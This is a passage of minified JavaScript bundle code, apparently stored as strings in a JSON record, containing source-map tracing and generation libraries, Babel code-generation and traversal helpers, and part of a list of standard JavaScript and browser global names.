kS!=\"undefined\"?t(yu,hm(),NS()):typeof define==\"function\"&&define.amd?define([\"exports\",\"@jridgewell/sourcemap-codec\",\"@jridgewell/resolve-uri\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.traceMapping={},e.sourcemapCodec,e.resolveURI))})(yu,function(e,t,r){\"use strict\";function n(M,$){return $&&!$.endsWith(\"/\")&&($+=\"/\"),r(M,$)}function s(M){if(!M)return\"\";let $=M.lastIndexOf(\"/\");return M.slice(0,$+1)}let i=0,a=1,o=2,l=3,u=4,c=1,f=2;function p(M,$){let W=m(M,0);if(W===M.length)return M;$||(M=M.slice());for(let J=W;J<M.length;J=m(M,J+1))M[J]=d(M[J],$);return M}function m(M,$){for(let W=$;W<M.length;W++)if(!b(M[W]))return W;return M.length}function b(M){for(let $=1;$<M.length;$++)if(M[$][i]<M[$-1][i])return!1;return!0}function d(M,$){return $||(M=M.slice()),M.sort(y)}function y(M,$){return M[i]-$[i]}let v=!1;function I(M,$,W,J){for(;W<=J;){let Ae=W+(J-W>>1),le=M[Ae][i]-$;if(le===0)return v=!0,Ae;le<0?W=Ae+1:J=Ae-1}return v=!1,W-1}function D(M,$,W){for(let J=W+1;J<M.length&&M[J][i]===$;W=J++);return W}function O(M,$,W){for(let J=W-1;J>=0&&M[J][i]===$;W=J--);return W}function _(){return{lastKey:-1,lastNeedle:-1,lastIndex:-1}}function F(M,$,W,J){let{lastKey:Ae,lastNeedle:le,lastIndex:_e}=W,Re=0,we=M.length-1;if(J===Ae){if($===le)return v=_e!==-1&&M[_e][i]===$,_e;$>=le?Re=_e===-1?0:_e:we=_e}return W.lastKey=J,W.lastNeedle=$,W.lastIndex=I(M,$,Re,we)}function R(M,$){let W=$.map(te);for(let J=0;J<M.length;J++){let Ae=M[J];for(let le=0;le<Ae.length;le++){let _e=Ae[le];if(_e.length===1)continue;let Re=_e[a],we=_e[o],nt=_e[l],vt=W[Re],Je=vt[we]||(vt[we]=[]),st=$[Re],xt=D(Je,nt,F(Je,nt,st,we));st.lastIndex=++xt,K(Je,xt,[nt,J,_e[i]])}}return W}function K(M,$,W){for(let J=M.length;J>$;J--)M[J]=M[J-1];M[$]=W}function te(){return{__proto__:null}}let se=function(M,$){let W=Te(M);if(!(\"sections\"in W))return new Se(W,$);let J=[],Ae=[],le=[],_e=[],Re=[];Pe(W,$,J,Ae,le,_e,Re,0,0,1/0,1/0);let we={version:3,file:W.file,names:_e,sources:Ae,sourcesContent:le,mappings:J,ignoreList:Re};return Ma(we)};function Te(M){return typeof M==\"string\"?JSON.parse(M):M}function Pe(M,$,W,J,Ae,le,_e,Re,we,nt,vt){let{sections:Je}=M;for(let st=0;st<Je.length;st++){let{map:xt,offset:Ot}=Je[st],Ar=nt,dn=vt;if(st+1<Je.length){let ns=Je[st+1].offset;Ar=Math.min(nt,Re+ns.line),Ar===nt?dn=Math.min(vt,we+ns.column):Ar<nt&&(dn=we+ns.column)}Be(xt,$,W,J,Ae,le,_e,Re+Ot.line,we+Ot.column,Ar,dn)}}function Be(M,$,W,J,Ae,le,_e,Re,we,nt,vt){let Je=Te(M);if(\"sections\"in Je)return Pe(...arguments);let st=new Se(Je,$),xt=J.length,Ot=le.length,Ar=qe(st),{resolvedSources:dn,sourcesContent:ns,ignoreList:wi}=st;if(dt(J,dn),dt(le,st.names),ns)dt(Ae,ns);else for(let lr=0;lr<dn.length;lr++)Ae.push(null);if(wi)for(let lr=0;lr<wi.length;lr++)_e.push(wi[lr]+xt);for(let lr=0;lr<Ar.length;lr++){let Di=Re+lr;if(Di>nt)return;let F1=j(W,Di),C3=lr===0?we:0,j1=Ar[lr];for(let Yp=0;Yp<j1.length;Yp++){let Vs=j1[Yp],Nl=C3+Vs[i];if(Di===nt&&Nl>=vt)return;if(Vs.length===1){F1.push([Nl]);continue}let L1=xt+Vs[a],M1=Vs[o],R1=Vs[l];F1.push(Vs.length===4?[Nl,L1,M1,R1]:[Nl,L1,M1,R1,Ot+Vs[u]])}}}function dt(M,$){for(let W=0;W<$.length;W++)M.push($[W])}function j(M,$){for(let W=M.length;W<=$;W++)M[W]=[];return M[$]}let q=\"`line` must be greater than 0 (lines start at line 1)\",Y=\"`column` must be greater than or equal to 0 (columns start at column 0)\",re=-1,me=1;class Se{constructor($,W){let J=typeof $==\"string\";if(!J&&$._decodedMemo)return $;let Ae=J?JSON.parse($):$,{version:le,file:_e,names:Re,sourceRoot:we,sources:nt,sourcesContent:vt}=Ae;this.version=le,this.file=_e,this.names=Re||[],this.sourceRoot=we,this.sources=nt,this.sourcesContent=vt,this.ignoreList=Ae.ignoreList||Ae.x_google_ignoreList||void 0;let Je=n(we||\"\",s(W));this.resolvedSources=nt.map(xt=>n(xt||\"\",Je));let{mappings:st}=Ae;typeof st==\"string\"?(this._encoded=st,this._decoded=void 0):(this._encoded=void 0,this._decoded=p(st,J)),this._decodedMemo=_(),this._bySources=void 0,this._bySourceMemos=void 0}}function pe(M){return M}function Fe(M){var $,W;return($=(W=M)._encoded)!==null&&$!==void 0?$:W._encoded=t.encode(M._decoded)}function qe(M){var $;return($=M)._decoded||($._decoded=t.decode(M._encoded))}function Ge(M,$,W){let J=qe(M);if($>=J.length)return null;let Ae=J[$],le=oe(Ae,M._decodedMemo,$,W,me);return le===-1?null:Ae[le]}function fe(M,$){let{line:W,column:J,bias:Ae}=$;if(W--,W<0)throw new Error(q);if(J<0)throw new Error(Y);let le=qe(M);if(W>=le.length)return Us(null,null,null,null);let _e=le[W],Re=oe(_e,M._decodedMemo,W,J,Ae||me);if(Re===-1)return Us(null,null,null,null);let we=_e[Re];if(we.length===1)return Us(null,null,null,null);let{names:nt,resolvedSources:vt}=M;return Us(vt[we[a]],we[o]+1,we[l],we.length===5?nt[we[u]]:null)}function Qe(M,$){let{source:W,line:J,column:Ae,bias:le}=$;return je(M,W,J,Ae,le||me,!1)}function It(M,$){let{source:W,line:J,column:Ae,bias:le}=$;return je(M,W,J,Ae,le||re,!0)}function Rt(M,$){let W=qe(M),{names:J,resolvedSources:Ae}=M;for(let le=0;le<W.length;le++){let _e=W[le];for(let Re=0;Re<_e.length;Re++){let we=_e[Re],nt=le+1,vt=we[0],Je=null,st=null,xt=null,Ot=null;we.length!==1&&(Je=Ae[we[1]],st=we[2]+1,xt=we[3]),we.length===5&&(Ot=J[we[4]]),$({generatedLine:nt,generatedColumn:vt,source:Je,originalLine:st,originalColumn:xt,name:Ot})}}}function Pr(M,$){let{sources:W,resolvedSources:J}=M,Ae=W.indexOf($);return Ae===-1&&(Ae=J.indexOf($)),Ae}function fn(M,$){let{sourcesContent:W}=M;if(W==null)return null;let J=Pr(M,$);return J===-1?null:W[J]}function An(M,$){let{ignoreList:W}=M;if(W==null)return!1;let J=Pr(M,$);return J===-1?!1:W.includes(J)}function Ma(M,$){let W=new Se(Cn(M,[]),$);return W._decoded=M.mappings,W}function Rs(M){return Cn(M,qe(M))}function qs(M){return Cn(M,Fe(M))}function Cn(M,$){return{version:M.version,file:M.file,names:M.names,sourceRoot:M.sourceRoot,sources:M.sources,sourcesContent:M.sourcesContent,mappings:$,ignoreList:M.ignoreList||M.x_google_ignoreList}}function Us(M,$,W,J){return{source:M,line:$,column:W,name:J}}function pn(M,$){return{line:M,column:$}}function oe(M,$,W,J,Ae){let le=F(M,J,$,W);return v?le=(Ae===re?D:O)(M,J,le):Ae===re&&le++,le===-1||le===M.length?-1:le}function ee(M,$,W,J,Ae){let le=oe(M,$,W,J,me);if(!v&&Ae===re&&le++,le===-1||le===M.length)return[];let _e=v?J:M[le][i];v||(le=O(M,_e,le));let Re=D(M,_e,le),we=[];for(;le<=Re;le++){let nt=M[le];we.push(pn(nt[c]+1,nt[f]))}return we}function je(M,$,W,J,Ae,le){var _e;if(W--,W<0)throw new Error(q);if(J<0)throw new Error(Y);let{sources:Re,resolvedSources:we}=M,nt=Re.indexOf($);if(nt===-1&&(nt=we.indexOf($)),nt===-1)return le?[]:pn(null,null);let Je=((_e=M)._bySources||(_e._bySources=R(qe(M),M._bySourceMemos=Re.map(_))))[nt][W];if(Je==null)return le?[]:pn(null,null);let st=M._bySourceMemos[nt];if(le)return ee(Je,st,W,J,Ae);let xt=oe(Je,st,W,J,Ae);if(xt===-1)return pn(null,null);let Ot=Je[xt];return pn(Ot[c]+1,Ot[f])}e.AnyMap=se,e.GREATEST_LOWER_BOUND=me,e.LEAST_UPPER_BOUND=re,e.TraceMap=Se,e.allGeneratedPositionsFor=It,e.decodedMap=Rs,e.decodedMappings=qe,e.eachMapping=Rt,e.encodedMap=qs,e.encodedMappings=Fe,e.generatedPositionFor=Qe,e.isIgnored=An,e.originalPositionFor=fe,e.presortedDecodedMap=Ma,e.sourceContentFor=fn,e.traceSegment=Ge})});var gm=E((bu,BS)=>{(function(e,t){typeof bu==\"object\"&&typeof BS!=\"undefined\"?t(bu,OS(),hm(),gu()):typeof define==\"function\"&&define.amd?define([\"exports\",\"@jridgewell/set-array\",\"@jridgewell/sourcemap-codec\",\"@jridgewell/trace-mapping\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.genMapping={},e.setArray,e.sourcemapCodec,e.traceMapping))})(bu,function(e,t,r,n){\"use strict\";class c{constructor({file:q,sourceRoot:Y}={}){this._names=new t.SetArray,this._sources=new t.SetArray,this._sourcesContent=[],this._mappings=[],this.file=q,this.sourceRoot=Y,this._ignoreList=new t.SetArray}}function f(j){return j}function p(j,q,Y,re,me,Se,pe,Fe){return F(!1,j,q,Y,re,me,Se,pe,Fe)}function m(j,q){return dt(!1,j,q)}let b=(j,q,Y,re,me,Se,pe,Fe)=>F(!0,j,q,Y,re,me,Se,pe,Fe),d=(j,q)=>dt(!0,j,q);function y(j,q,Y){let{_sources:re,_sourcesContent:me}=j,Se=t.put(re,q);me[Se]=Y}function v(j,q,Y=!0){let{_sources:re,_sourcesContent:me,_ignoreList:Se}=j,pe=t.put(re,q);pe===me.length&&(me[pe]=null),Y?t.put(Se,pe):t.remove(Se,pe)}function I(j){let{_mappings:q,_sources:Y,_sourcesContent:re,_names:me,_ignoreList:Se}=j;return se(q),{version:3,file:j.file||void 0,names:me.array,sourceRoot:j.sourceRoot||void 0,sources:Y.array,sourcesContent:re,mappings:q,ignoreList:Se.array}}function D(j){let q=I(j);return Object.assign(Object.assign({},q),{mappings:r.encode(q.mappings)})}function O(j){let q=new n.TraceMap(j),Y=new c({file:q.file,sourceRoot:q.sourceRoot});return Te(Y._names,q.names),Te(Y._sources,q.sources),Y._sourcesContent=q.sourcesContent||q.sources.map(()=>null),Y._mappings=n.decodedMappings(q),q.ignoreList&&Te(Y._ignoreList,q.ignoreList),Y}function _(j){let q=[],{_mappings:Y,_sources:re,_names:me}=j;for(let Se=0;Se<Y.length;Se++){let pe=Y[Se];for(let Fe=0;Fe<pe.length;Fe++){let qe=pe[Fe],Ge={line:Se+1,column:qe[0]},fe,Qe,It;qe.length!==1&&(fe=re.array[qe[1]],Qe={line:qe[2]+1,column:qe[3]},qe.length===5&&(It=me.array[qe[4]])),q.push({generated:Ge,source:fe,original:Qe,name:It})}}return q}function F(j,q,Y,re,me,Se,pe,Fe,qe){let{_mappings:Ge,_sources:fe,_sourcesContent:Qe,_names:It}=q,Rt=R(Ge,Y),Pr=K(Rt,re);if(!me)return j&&Pe(Rt,Pr)?void 0:te(Rt,Pr,[re]);let fn=t.put(fe,me),An=Fe?t.put(It,Fe):-1;if(fn===Qe.length&&(Qe[fn]=qe!=null?qe:null),!(j&&Be(Rt,Pr,fn,Se,pe,An)))return te(Rt,Pr,Fe?[re,fn,Se,pe,An]:[re,fn,Se,pe])}function R(j,q){for(let Y=j.length;Y<=q;Y++)j[Y]=[];return j[q]}function K(j,q){let Y=j.length;for(let re=Y-1;re>=0;Y=re--){let me=j[re];if(q>=me[0])break}return Y}function te(j,q,Y){for(let re=j.length;re>q;re--)j[re]=j[re-1];j[q]=Y}function se(j){let{length:q}=j,Y=q;for(let re=Y-1;re>=0&&!(j[re].length>0);Y=re,re--);Y<q&&(j.length=Y)}function Te(j,q){for(let Y=0;Y<q.length;Y++)t.put(j,q[Y])}function Pe(j,q){return q===0?!0:j[q-1].length===1}function Be(j,q,Y,re,me,Se){if(q===0)return!1;let pe=j[q-1];return pe.length===1?!1:Y===pe[1]&&re===pe[2]&&me===pe[3]&&Se===(pe.length===5?pe[4]:-1)}function dt(j,q,Y){let{generated:re,source:me,original:Se,name:pe,content:Fe}=Y;return me?F(j,q,re.line-1,re.column,me,Se.line-1,Se.column,pe,Fe):F(j,q,re.line-1,re.column,null,null,null,null,null)}e.GenMapping=c,e.addMapping=m,e.addSegment=p,e.allMappings=_,e.fromMap=O,e.maybeAddMapping=d,e.maybeAddSegment=b,e.setIgnore=v,e.setSourceContent=y,e.toDecodedMap=I,e.toEncodedMap=D,Object.defineProperty(e,\"__esModule\",{value:!0})})});var FS=E(Eu=>{\"use strict\";Object.defineProperty(Eu,\"__esModule\",{value:!0});Eu.default=void 0;var fs=gm(),bm=gu(),Em=class{constructor(t,r){var n;this._map=void 0,this._rawMappings=void 0,this._sourceFileName=void 0,this._lastGenLine=0,this._lastSourceLine=0,this._lastSourceColumn=0,this._inputMap=void 0;let s=this._map=new fs.GenMapping({sourceRoot:t.sourceRoot});if(this._sourceFileName=(n=t.sourceFileName)==null?void 0:n.replace(/\\\\/g,\"/\"),this._rawMappings=void 0,t.inputSourceMap){this._inputMap=new bm.TraceMap(t.inputSourceMap);let a=this._inputMap.resolvedSources;if(a.length)for(let o=0;o<a.length;o++){var i;(0,fs.setSourceContent)(s,a[o],(i=this._inputMap.sourcesContent)==null?void 0:i[o])}}if(typeof r==\"string\"&&!t.inputSourceMap)(0,fs.setSourceContent)(s,this._sourceFileName,r);else if(typeof r==\"object\")for(let a of Object.keys(r))(0,fs.setSourceContent)(s,a.replace(/\\\\/g,\"/\"),r[a])}get(){return(0,fs.toEncodedMap)(this._map)}getDecoded(){return(0,fs.toDecodedMap)(this._map)}getRawMappings(){return this._rawMappings||(this._rawMappings=(0,fs.allMappings)(this._map))}mark(t,r,n,s,i,a){var o;this._rawMappings=void 0;let l;if(r!=null)if(this._inputMap){if(l=(0,bm.originalPositionFor)(this._inputMap,{line:r,column:n}),!l.name&&i){let u=(0,bm.originalPositionFor)(this._inputMap,i);u.name&&(s=u.name)}}else l={source:(a==null?void 0:a.replace(/\\\\/g,\"/\"))||this._sourceFileName,line:r,column:n};(0,fs.maybeAddMapping)(this._map,{name:s,generated:t,source:(o=l)==null?void 0:o.source,original:l})}};Eu.default=Em});var jS=E(vu=>{\"use strict\";Object.defineProperty(vu,\"__esModule\",{value:!0});vu.default=void 0;var vm=class{constructor(t,r){this._map=null,this._buf=\"\",this._str=\"\",this._appendCount=0,this._last=0,this._queue=[],this._queueCursor=0,this._canMarkIdName=!0,this._indentChar=\"\",this._fastIndentations=[],this._position={line:1,column:0},this._sourcePosition={identifierName:void 0,identifierNamePos:void 0,line:void 0,column:void 0,filename:void 0},this._map=t,this._indentChar=r;for(let n=0;n<64;n++)this._fastIndentations.push(r.repeat(n));this._allocQueue()}_allocQueue(){let t=this._queue;for(let r=0;r<16;r++)t.push({char:0,repeat:1,line:void 0,column:void 0,identifierName:void 0,identifierNamePos:void 0,filename:\"\"})}_pushQueue(t,r,n,s,i){let a=this._queueCursor;a===this._queue.length&&this._allocQueue();let o=this._queue[a];o.char=t,o.repeat=r,o.line=n,o.column=s,o.filename=i,this._queueCursor++}_popQueue(){if(this._queueCursor===0)throw new Error(\"Cannot pop from empty queue\");return this._queue[--this._queueCursor]}get(){this._flush();let t=this._map,r={code:(this._buf+this._str).trimRight(),decodedMap:t==null?void 0:t.getDecoded(),get __mergedMap(){return this.map},get map(){let n=t?t.get():null;return r.map=n,n},set map(n){Object.defineProperty(r,\"map\",{value:n,writable:!0})},get rawMappings(){let n=t==null?void 0:t.getRawMappings();return r.rawMappings=n,n},set rawMappings(n){Object.defineProperty(r,\"rawMappings\",{value",
                      "markdown": "`sm,exportNamedDeclaration:cS,exportSpecifier:fS,identifier:im,variableDeclaration:nY,variableDeclarator:sY}=rY;function iY(e){if(!e.isExportDeclaration()||e.isExportAllDeclaration())throw new Error(\"Only default and named export declarations can be split.\");if(e.isExportDefaultDeclaration()){let i=e.get(\"declaration\"),a=i.isFunctionDeclaration()||i.isClassDeclaration(),o=i.isFunctionExpression()||i.isClassExpression(),l=i.isScope()?i.scope.parent:i.scope,u=i.node.id,c=!1;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{value:!0});uu.default=void 0;var lY=no(),uY=De(),cY=cs(),fY=cu(),pY=ro(),dY={ReferencedIdentifier({node:e},t){e.name===t.oldName&&(e.name=t.newName)},Scope(e,t){e.scope.bindingIdentifierEquals(t.oldName,t.binding.identifier)||(e.skip(),e.isMethod()&&(0,cY.requeueComputedKeyAndDecorators)(e))},ObjectProperty({node:e,scope:t},r){let{name:n}=e.key;if(e.shorthand&&(n===r.oldName||n===r.newName)&&t.getBindingIdentifier(n)===r.binding.identifier){var s;e.shorthand=!1,(s=e.extra)!=null&&s.shorthand&&(e.extra.shorthand=!1)}},\"AssignmentExpression|Declaration|VariableDeclarator\"(e,t){if(e.isVariableDeclaration())return;let r=e.getOuterBindingIdentifiers();for(let n in r)n===t.oldName&&(r[n].name=t.newName)}},lm=class{constructor(t,r,n){this.newName=n,this.oldName=r,this.binding=t}maybeConvertFromExportDeclaration(t){let r=t.parentPath;if(r.isExportDeclaration()){if(r.isExportDefaultDeclaration()){let{declaration:n}=r.node;if(uY.isDeclaration(n)&&!n.id)return}r.isExportAllDeclaration()||(0,lY.default)(r)}}maybeConvertFromClassFunctionDeclaration(t){return t}maybeConvertFromClassFunctionExpression(t){return t}rename(){let{binding:t,oldName:r,newName:n}=this,{scope:s,path:i}=t,a=i.find(l=>l.isDeclaration()||l.isFunctionExpression()||l.isClassExpression());a&&a.getOuterBindingIdentifiers()[r]===t.identifier&&this.maybeConvertFromExportDeclaration(a);let o=arguments[0]||s.block;(0,fY.traverseNode)(o,(0,pY.explode)(dY),s,this,s.path,{discriminant:!0}),arguments[0]||(s.removeOwnBinding(r),s.bindings[n]=t,this.binding.identifier.name=n),a&&(this.maybeConvertFromClassFunctionDeclaration(i),this.maybeConvertFromClassFunctionExpression(i))}};uu.default=lm});var dS=E(fu=>{\"use strict\";Object.defineProperty(fu,\"__esModule\",{value:!0});fu.default=void 0;var um=class{constructor({identifier:t,scope:r,path:n,kind:s}){this.identifier=void 0,this.scope=void 0,this.path=void 0,this.kind=void 0,this.constantViolations=[],this.constant=!0,this.referencePaths=[],this.referenced=!1,this.references=0,this.identifier=t,this.scope=r,this.path=n,this.kind=s,(s===\"var\"||s===\"hoisted\")&&hY(n)&&this.reassign(n),this.clearValue()}deoptValue(){this.clearValue(),this.hasDeoptedValue=!0}setValue(t){this.hasDeoptedValue||(this.hasValue=!0,this.value=t)}clearValue(){this.hasDeoptedValue=!1,this.hasValue=!1,this.value=null}reassign(t){this.constant=!1,this.constantViolations.indexOf(t)===-1&&this.constantViolations.push(t)}reference(t){this.referencePaths.indexOf(t)===-1&&(this.referenced=!0,this.references++,this.referencePaths.push(t))}dereference(){this.references--,this.referenced=!!this.references}};fu.default=um;function hY(e){for(let{parentPath:t,key:r}=e;t;{parentPath:t,key:r}=t){if(t.isFunctionParent())return!1;if(t.isWhile()||t.isForXStatement()||t.isForStatement()&&r===\"body\")return!0}return!1}});var hS=E((SCe,mY)=>{mY.exports={builtin:{Array:!1,ArrayBuffer:!1,Atomics:!1,BigInt:!1,BigInt64Array:!1,BigUint64Array:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,globalThis:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,SharedArrayBuffer:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},es5:{Array:!1,Boolean:!1,constructor:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,propertyIsEnumerable:!1,RangeError:!1,ReferenceError:!1,RegExp:!1,String:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1},es2015:{Array:!1,ArrayBuffer:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},es2017:{Array:!1,ArrayBuffer:!1,Atomics:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,SharedArrayBuffer:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},browser:{AbortController:!1,AbortSignal:!1,addEventListener:!1,alert:!1,AnalyserNode:!1,Animation:!1,AnimationEffectReadOnly:!1,AnimationEffectTiming:!1,AnimationEffectTimingReadOnly:!1,AnimationEvent:!1,AnimationPlaybackEvent:!1,AnimationTimeline:!1,applicationCache:!1,ApplicationCache:!1,ApplicationCacheErrorEvent:!1,atob:!1,Attr:!1,Audio:!1,AudioBuffer:!1,AudioBufferSourceNode:!1,AudioContext:!1,AudioDestinationNode:!1,AudioListener:!1,AudioNode:!1,AudioParam:!1,AudioProcessingEvent:!1,AudioScheduledSourceNode:!1,\"AudioWorkletGlobalScope \":!1,AudioWorkletNode:!1,AudioWorkletProcessor:!1,BarProp:!1,BaseAudioContext:!1,BatteryManager:!1,BeforeUnloadEvent:!1,BiquadFilterNode:!1,Blob:!1,BlobEvent:!1,blur:!1,BroadcastChannel:!1,btoa:!1,BudgetService:!1,ByteLengthQueuingStrategy:!1,Cache:!1,caches:!1,CacheStorage:!1,cancelAnimationFrame:!1,cancelIdleCallback:!1,CanvasCaptureMediaStreamTrack:!1,CanvasGradient:!1,CanvasPattern:!1,CanvasRenderingContext2D:!1,ChannelMergerNode:!1,ChannelSplitterNode:!1,CharacterData:!1,clearInterval:!1,clearTimeout:!1,clientInformation:!1,ClipboardEvent:!1,close:!1,closed:!1,CloseEvent:!1,Comment:!1,CompositionEvent:!1,confirm:!1,console:!1,ConstantSourceNode:!1,ConvolverNode:!1,CountQueuingStrategy:!1,createImageBitmap:!1,Credential:!1,CredentialsContainer:!1,crypto:!1,Crypto:!1,CryptoKey:!1,CSS:!1,CSSConditionRule:!1,CSSFontFaceRule:!1,CSSGroupingRule:!1,CSSImportRule:!1,CSSKeyframeRule:!1,CSSKeyframesRule:!1,CSSMediaRule:!1,CSSNamespaceRule:!1,CSSPageRule:!1,CSSRule:!1,CSSRuleList:!1,CSSStyleDeclaration:!1,CSSStyleRule:!1,CSSStyleSheet:!1,CSSSupportsRule:!1,CustomElementRegistry:!1,customElements:!1,CustomEvent:!1,DataTransfer:!1,DataTransferItem:!1,DataTransferItemList:!1,defaultstatus:!1,defaultStatus:!1,DelayNode:!1,DeviceMotionEvent:!1,DeviceOrientationEvent:!1,devicePixelRatio:!1,dispatchEvent:!1,document:!1,Document:!1,DocumentFragment:!1,DocumentType:!1,DOMError:!1,DOMException:!1,DOMImplementation:!1,DOMMatrix:!1,DOMMatrixReadOnly:!1,DOMParser:!1,DOMPoint:!1,DOMPointReadOnly:!1,DOMQuad:!1,DOMRect:!1,DOMRectReadOnly:!1,DOMStringList:!1,DOMStringMap:!1,DOMTokenList:!1,DragEvent:!1,DynamicsCompressorNode:!1,Element:!1,ErrorEvent:!1,event:!1,Event:!1,EventSource:!1,EventTarget:!1,external:!1,fetch:!1,File:!1,FileList:!1,FileReader:!1,find:!1,focus:!1,FocusEvent:!1,FontFace:!1,FontFaceSetLoadEvent:!1,FormData:!1,frameElement:!1,frames:!1,GainNode:!1,Gamepad:!1,GamepadButton:!1,GamepadEvent:!1,getComputedStyle:!1,getSelection:!1,HashChangeEvent:!1,Headers:!1,history:!1,History:!1,HTMLAllCollection:!1,HTMLAnchorElement:!1,HTMLAreaElement:!1,HTMLAudioElement:!1,HTMLBaseElement:!1,HTMLBodyElement:!1,HTMLBRElement:!1,HTMLButtonElement:!1,HTMLCanvasElement:!1,HTMLCollection:!1,HTMLContentElement:!1,HTMLDataElement:!1,HTMLDataListElement:!1,HTMLDetailsElement:!1,HTMLDialogElement:!1,HTMLDirectoryElement:!1,HTMLDivElement:!1,HTMLDListElement:!1,HTMLDocument:!1,HTMLElement:!1,HTMLEmbedElement:!1,HTMLFieldSetElement:!1,HTMLFontElement:!1,HTMLFormControlsCollection:!1,HTMLFormElement:!1,HTMLFrameElement:!1,HTMLFrameSetElement:!1,HTMLHeadElement:!1,HTMLHeadingElement:!1,HTMLHRElement:!1,HTMLHtmlElement:!1,HTMLIFrameElement:!1,HTMLImageElement:!1,HTMLInputElement:!1,HTMLLabelElement:!1,HTMLLegendElement:!1,HTMLLIElement:!1,HTMLLinkElement:!1,HTMLMapElement:!1,HTMLMarqueeElement:!1,HTMLMediaElement:!1,HTMLMenuElement:!1,HTMLMetaElement:!1,HTMLMeterElement:!1,HTMLModElement:!1,HTMLObjectElement:!1,HTMLOListElement:!1,HTMLOptGroupElement:!1,HTMLOptionElement:!1,HTMLOptionsCollection:!1,HTMLOutputElement:!1,HTMLParagraphElement:!1,HTMLParamElement:!1,HTMLPictureElement:!1,HTMLPreElement:!1,HTMLProgressElement:!1,HTMLQuoteElement:!1,HTMLScriptElement:!1,HTMLSelectElement:!1,HTMLShadowElement:!1,HTMLSlotElement:!1,HTMLSourceElement:!1,HTMLSpanElement:!1,HTMLStyleElement:!1,HTMLTableCaptionElement:!1,HTMLTableCellElement:!1,HTMLTableColElement:!1,HTMLTableElement:!1,HTMLTableRowElement:!1,HTMLTableSectionElement:!1,HTMLTemplateElement:!1,HTMLTextAreaElement:!1,HTMLTimeElement:!1,HTMLTitleElement:!1,HTMLTrackElement:!1,HTMLUListElement:!1,HTMLUnknownElement:!1,HTMLVideoElement:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectSto